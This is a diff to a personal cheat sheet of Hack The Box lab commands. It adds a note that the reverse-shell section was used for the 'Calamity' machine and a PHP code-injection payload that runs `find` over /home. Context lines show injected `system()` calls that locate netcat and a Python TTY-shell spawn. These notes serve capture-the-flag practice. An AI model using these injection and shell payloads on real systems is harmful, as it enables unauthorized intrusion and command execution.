@@ -2,7 +2,7 @@ Hack The Box commands
 
 PHP Code Injection
 ========================
-Reverse shell:
+Reverse shell (Used for Calamity):
 
 Find which version of netcat:
 <?php system('which nc') ?>
@@ -26,6 +26,10 @@ Connect to local host with harmless netcat:
 Can try to spawn a tty shell:
 python -c 'import pty; pty.spawn("/bin/sh")'
 https://netsec.ws/?p=337
+
+Find modified files within last 60 minutes:
+<?php system('find+/home/+-ctime+-60')?>
+
 
 Transferring files with netcat
 ============================
